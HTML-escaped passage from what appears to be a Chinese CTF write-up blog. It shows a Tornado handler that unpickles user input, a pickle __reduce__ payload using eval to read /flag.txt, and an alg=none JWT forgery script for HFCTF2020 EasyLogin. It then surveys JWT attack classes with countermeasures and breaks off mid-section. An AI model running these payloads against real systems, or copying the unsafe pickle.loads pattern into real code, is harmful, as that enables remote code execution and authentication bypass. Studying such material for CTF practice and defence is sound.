class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import tornado.web&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from sshop.base import BaseHandler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import urllib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class AdminHandler(BaseHandler):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @tornado.web.authenticated&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def get(self, *args, **kwargs):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if self.current_user == &amp;quot;admin&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return self.render(&amp;#x27;form.html&amp;#x27;, res=&amp;#x27;This is Black Technology!&amp;#x27;, member=0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return self.render(&amp;#x27;no_ass.html&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @tornado.web.authenticated&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def post(self, *args, **kwargs):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            become = self.get_argument(&amp;#x27;become&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p = pickle.loads(urllib.unquote(become))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return self.render(&amp;#x27;form.html&amp;#x27;, res=p, member=1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return self.render(&amp;#x27;form.html&amp;#x27;, res=&amp;#x27;This is Black Technology!&amp;#x27;, member=0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import urllib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class payload(object):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       return (eval, (&amp;quot;open(&amp;#x27;/flag.txt&amp;#x27;,&amp;#x27;r&amp;#x27;).read()&amp;quot;,))    #打开读取flag.txt的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = pickle.dumps(payload())  #序列化payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = urllib.quote(a)  #进行url编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207140234730.png&#34; alt=&#34;image-20221207140234730&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;hfctf2020easylogin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hfctf2020easylogin&#34;&gt;#&lt;/a&gt; [HFCTF2020]EasyLogin&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Node 的 JWT 库的空加密缺陷&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过查看源码，发现 /static/js/app.js 页面存在提示&lt;br&gt;
&lt;strong&gt; koa-static 错误配置的源码泄露&lt;/strong&gt;&lt;br&gt;
说明 app.js 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/**&lt;br&gt;
*  或许该用 koa-static 来处理静态文件&lt;br&gt;
 *  路径该怎么配置？不管了先填个根目录 XD&lt;br&gt;
*/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关与 node 的代码分析不再叙述，可以到哦下面的连接自己看&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 将加密方式改为 none&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;签名算法确保恶意用户在传输过程中不会修改 JWT。但是标题中的 alg 字段可以更改为 none。一些 JWT 库支持无算法，即没有签名算法。当 alg 为 none 时，后端将不执行签名验证。将 alg 更改为 none 后，从 JWT 中删除签名数据（仅标题 +’.’+ payload +’.’）并将其提交给服务器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;2、secretid 值校验&lt;/strong&gt;&lt;br&gt;
要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。&lt;br&gt;
JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# py脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import jwt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;token = jwt.encode(&amp;#123;&amp;quot;secretid&amp;quot;:0.1,&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;admin&amp;quot;&amp;#125;,algorithm=&amp;quot;none&amp;quot;,key=&amp;quot;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(token)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 登录时抓包改 authorization&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207144053858.png&#34; alt=&#34;image-20221207144053858&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者自己进行 base64 编码然后拼接，注入拼接时去掉 base64 的 =&lt;/p&gt;
&lt;p&gt;登录后即可 getflag&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dyYjgxOS9hcnRpY2xlL2RldGFpbHMvMTE3ODg2NTcw&#34;&gt;(72 条消息) CTFHUB-2020 - 虎符 - Web-easy_login-Node.js - 前端 JWT_(∪.∪ )…zzz 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wZjc2ZTFjNjllMzM=&#34;&gt;2020 - 虎符网络安全赛道 - Web-easy_login - 简书 (jianshu.com)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;jwt名词解释&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt名词解释&#34;&gt;#&lt;/a&gt; jwt 名词解释&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;1.JWS：Signed JWT 签名过的 jwt&lt;/p&gt;
&lt;p&gt;2.JWE：Encrypted JWT 部分 payload 经过加密的 jwt；&lt;/p&gt;
&lt;p&gt;目前加密 payload 的操作不是很普及；&lt;/p&gt;
&lt;p&gt;3.JWK：JWT 的密钥，也就是我们常说的 scret；&lt;/p&gt;
&lt;p&gt;4.JWKset：JWT key set 在非对称加密中，需要的是密钥对而非单独的密钥，在后文中会阐释；&lt;/p&gt;
&lt;p&gt;5.JWA：当前 JWT 所用到的密码学算法；&lt;/p&gt;
&lt;p&gt;6.nonsecure JWT：当头部的签名算法被设定为 none 的时候，该 JWT 是不安全的；因为签名的部分空缺，所有人都可以修改。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;jws-的结构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jws-的结构&#34;&gt;#&lt;/a&gt; JWS 的结构&lt;/h3&gt;
&lt;p&gt;JWS ，也就是 JWT Signature，其结构就是在之前 nonsecure JWT 的基础上，在头部声明签名算法，并在最后添加上签名。创建签名，是保证 jwt 不能被他人随意篡改。&lt;/p&gt;
&lt;p&gt;为了完成签名，除了用到 header 信息和 payload 信息外，还需要算法的密钥，也就是 secret。当利用非对称加密方法的时候，这里的 secret 为私钥。&lt;/p&gt;
&lt;p&gt;为了方便后文的展开，我们把 JWT 的密钥或者密钥对，统一称为 JSON Web Key，也就是 JWK。&lt;/p&gt;
&lt;p&gt;到目前为止，jwt 的签名算法有三种。&lt;/p&gt;
&lt;p&gt;对称加密 HMAC【哈希消息验证码】：HS256/HS384/HS512&lt;/p&gt;
&lt;p&gt;非对称加密 RSASSA【RSA 签名算法】（RS256/RS384/RS512）和 ECDSA【椭圆曲线数据签名算法】（ES256/ES384/ES512）&lt;/p&gt;
&lt;p&gt;最后将签名与之前的两段内容用。连接，就可以得到经过签名的 JWT，也就是 JWS。&lt;/p&gt;
&lt;p&gt;当验证签名的时候，利用公钥或者密钥来解密 Sign，和 base64UrlEncode (header) + “.” + base64UrlEncode (payload) 的内容完全一样的时候，表示验证通过。&lt;/p&gt;
&lt;h3 id=&#34;jwt-攻击手段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt-攻击手段&#34;&gt;#&lt;/a&gt; JWT 攻击手段&lt;/h3&gt;
&lt;p&gt;JWT 的攻击手段包括以下内容：&lt;/p&gt;
&lt;p&gt;参考网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hdXRoMC5jb20vYmxvZy9jcml0aWNhbC12dWxuZXJhYmlsaXRpZXMtaW4tanNvbi13ZWItdG9rZW4tbGlicmFyaWVzLy8lRTMlODAlODI=&#34;&gt;https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//。&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-敏感信息泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-敏感信息泄露&#34;&gt;#&lt;/a&gt; 1. 敏感信息泄露&lt;/h4&gt;
&lt;p&gt;当服务端的秘钥泄密的时候，JWT 的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。&lt;/p&gt;
&lt;h4 id=&#34;2-将加密方式改为none&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-将加密方式改为none&#34;&gt;#&lt;/a&gt; 2. 将加密方式改为’none’&lt;/h4&gt;
&lt;p&gt;下文实战中的 Juice Shop JWT issue 1 便是这个问题。之前谈及过 nonsecure JWT 的问题。&lt;/p&gt;
&lt;p&gt;签名算法确保恶意用户在传输过程中不会修改 JWT。但是标题中的 alg 字段可以更改为 none。一些 JWT 库支持无算法，即没有签名算法。当 alg 为 none 时，后端将不执行签名验证。将 alg 更改为 none 后，从 JWT 中删除签名数据（仅标题 +’.’+ payload +’.’）并将其提交给服务器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决对策：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不允许出现 none 的方法；&lt;/p&gt;
&lt;p&gt;将开启 alg : none 作为一种额外的配置选项。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;3将算法rs256修改为hs256非对称密码算法对称密码算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3将算法rs256修改为hs256非对称密码算法对称密码算法&#34;&gt;#&lt;/a&gt; 3. 将算法 RS256 修改为 HS256（非对称密码算法 =&amp;gt; 对称密码算法）&lt;/h4&gt;
&lt;p&gt;HS256 使用密钥来签名和验证每个消息。而 RS256 使用私钥对消息进行签名并使用公钥进行认证。&lt;/p&gt;
&lt;p&gt;如果将算法从 RS256 更改为 HS256，则后端代码使用公钥作为密钥，然后使用 HS256 算法验证签名。由于攻击者有时可以获取公钥，因此攻击者可以将标头中的算法修改为 HS256，然后使用 RSA 公钥对数据进行签名。&lt;/p&gt;
&lt;p&gt;此时，后端代码就会使用 RSA 公钥 + HS256 算法进行签名验证，从而让验证通过。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决对策：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不允许 HS256 等对称加密 算法读取秘钥。jwtpy 就是限制了这种方法。当读取到 类似于 “— xxx key —” 的参数的时候应抛出错误；&lt;/p&gt;
&lt;p&gt;将秘钥与验证算法相互匹配。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;4-hs256对称加密密钥破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-hs256对称加密密钥破解&#34;&gt;#&lt;/a&gt; 4. HS256（对称加密）密钥破解&lt;/h4&gt;
&lt;p&gt;如果 HS256 密钥强度较弱，则可以直接强制使用，通过爆破 HS256 的秘钥可以完成该操作。难度比较低。解决对策很简单，使用复杂的秘钥即可。&lt;/p&gt;
&lt;h4 id=&#34;5-错误的堆叠加密签名验证假设&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-错误的堆叠加密签名验证假设&#34;&gt;#&lt;/a&gt; 5. 错误的堆叠加密 + 签名验证假设&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;错误的堆叠加密&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这种攻击发生在单个的或者嵌套的 JWE 中，我们想象一个 JWE 如下所示：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JWT RAW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header : ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload: &amp;quot;admin&amp;quot; : false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &amp;quot;uid&amp;quot;   : 123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &amp;quot;umail&amp;quot; : 123@126.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JWE Main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected / unprotected&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    recipients:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        en_key : key1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        en_key : key2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cipher : xxx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在攻击者不修改秘钥的情况下，对于 ciphertext 进行修改。往往会导致解密的失败。但是，即使是失败，很多 JWT 的解密也是会有输出的，在没有附加认证数据（ADD）的情况下更是如此。攻击者对于 ciphertext 的内容进行修改，可能会让其他的数据无法解密，但是只要最后输出的 payload 中，有 “admin&amp;quot;:true。 其目的就已经达到了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决对策：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;对于 JWE 而言，应当解密所有数据，而非从解密的结果中提取单个需要的数据。另外，利用附加认证数据 ADD，也是非常好的选择。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;签名假设验证&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这种攻击发生嵌套的 JWS 中。我们想象一个嵌套的 JWS, 其包括了两层的部分，其结构如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JWT Main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JWT Sub1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Signature2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Signature&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在，攻击者通过一定的方式，能够让外层的验证通过的时候，此时，系统还应该检查内层的签名数据，如果不检查，攻击者就可以随意篡改 payload 的数据，来达到越权的目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决对策：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因此对于嵌套 JWS 而言，应当验证所有层面的签名是否正确，而非验证最外层的签名是否正确就足够。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;6-无效椭圆曲线攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-无效椭圆曲线攻击&#34;&gt;#&lt;/a&gt; 6. 无效椭圆曲线攻击&lt;/h4&gt;
&lt;p&gt;椭圆曲线加密是一种非常安全的方式，甚至从某种程度上而言，比 RSA 更加安全。关于椭圆曲线的算法，在此不展开。&lt;/p&gt;
&lt;p&gt;在椭圆曲线加密中，公钥是椭圆曲线上的一个点，而私钥只是一个位于特殊但非常大的范围内的数字。 如果未验证对这些操作的输入，那攻击者就可以进行设计，从而恢复私钥。&lt;/p&gt;
&lt;p&gt;而这种攻击已在过去中得到证实。这类攻击被称为无效曲线攻击。这种攻击比较复杂，也设计到很多的数学知识。详细可以参考文档：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2dzLmFkb2JlLmNvbS9zZWN1cml0eS8yMDE3LzAzL2NyaXRpY2FsLXZ1bG5lcmFiaWxpdHktdW5jb3ZlcmVkLWluLWpzb24tZW5jcnlwdGlvbi5odG1s&#34;&gt;critical-vulnerability-uncovered-in-json-encryption&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决对策：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;检查传递给任何公共函数的所有输入是否有效是解决这类攻击的关键点。验证内容包括公钥是所选曲线的有效椭圆曲线点，以及私钥位于有效值范围内。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;7-替换攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-替换攻击&#34;&gt;#&lt;/a&gt; 7. 替换攻击&lt;/h4&gt;
&lt;p&gt;在这种攻击中，攻击者需要至少获得两种不同的 JWT，然后攻击者可以将令牌中的一个或者两个用在其他的地方。&lt;/p&gt;
&lt;p&gt;在 JWT 中，替换共叽有两种方式，我们称他们为相同接收方攻击（跨越式 JWT）和不同接收方攻击。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不同接收方攻击&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们可以设想一个业务逻辑如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Auth 机构，有着自己的私钥，并且给 App1 和 App2 发放了两个公钥，用于验证签名；&lt;/p&gt;
&lt;p&gt;Attacker 利用自己的秘钥登录了 App1。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此时 Auth 机构给 Attacker 下发了一个 附带签名的 JWT，其 payload 内容为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;uname&amp;#x27;:&amp;#x27;Attacker&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;role&amp;#x27; :&amp;#x27;admin&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时，如果 Attacker 知道 App1 和 App2 的公钥是同一个 Auth 签发的话，他可以利用这个 JWT 去登录 App2，从而获取 Admin 权限。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决方法：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在 jwt 中带上 aud 声明，比如 aud : App1 这样。来限定该 jwt 只能用于 App1。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;相同接收方攻击 / 跨越式 JWT same recipient/Cross JWT&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们可以设想一个业务逻辑如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在同一站点下，有两个应用程序，wordpress 和 phpmyadmin，他们都利用了相同的秘钥对和算法来验证 JWT 签名；&lt;/p&gt;
&lt;p&gt;站点管理员知道 Different Recipient 的问题，所以给 wordpress 的应用增加了 aud 验证，但是 phpmyadmin 的用户人数较少，没有增加 aud 的验证；&lt;/p&gt;
&lt;p&gt;Attacker 利用自己的秘钥登录了 wordpress。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此时 站点 给 Attacker 下发了一个 附带签名的 JWT，其 payload 内容为：&lt;/p&gt;
